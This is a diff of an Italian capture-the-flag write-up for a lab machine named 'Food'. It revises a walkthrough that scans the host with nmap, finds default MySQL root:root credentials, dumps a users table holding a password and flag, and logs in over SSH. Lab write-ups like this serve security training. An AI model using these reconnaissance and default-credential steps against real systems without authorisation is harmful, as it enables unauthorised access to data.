@@ -1,15 +1,14 @@
 # FOOD
 
 ### ENUMERAZIONE
-scan della macchina per torvare possibili porte e la versione di queste.
+
+scan della macchina per torvare possibili porte e la versione di queste. spiegazione [NMAP](TOOLS.md)
 
 ```bash
 nmap food.thm -sV -sC 
 ```
 
-### SERVIZIO SQL
-
-ho notato che è aperto un servizio sql adiamo ad analizzarlo meglio con nmap.
+dalla scansione notato che è aperto un servizio sql andiamo ad analizzarlo meglio con nmap.
 
 ```bash
 nmap food.thm -sV --script *sql* 
@@ -17,7 +16,9 @@ nmap food.thm -sV --script *sql*
 quando nmap finisce lo scan ci restituisce dati molto utili, per esempio che l'utente di mysql è root:root
 e questo ci da carta bianca sulla conessione all'sql.
 
-quindi mi collego all'sql.
+### SERVIZIO SQL
+
+quindi colleghiamoci all'sql e vediamo che dati contiene
 
 ```bash
 mysql -u root -h 10.10.79.244 -p
@@ -38,7 +39,6 @@ show databases;
 | users              |
 +--------------------+
 ```
-
 ecco la tables che ci serve andiamo a prenderla.
 ```bash
 use users
@@ -47,7 +47,6 @@ e successivamente.
 ```bash
 show tables;
 ```
-
 adesso abbiamo trovato una tables di nome user andiamo a leggere cosa c'è dentro.
 ```bash
 SELECT * FROM User;
@@ -63,6 +62,7 @@ ecco un utente con la sua password e un flag!
 entriamo in ssh.
 
 ## SSH
+spiegazione [ssh](TOOLS.md)
 ```bash
 ssh ramen@food.thm
 ```
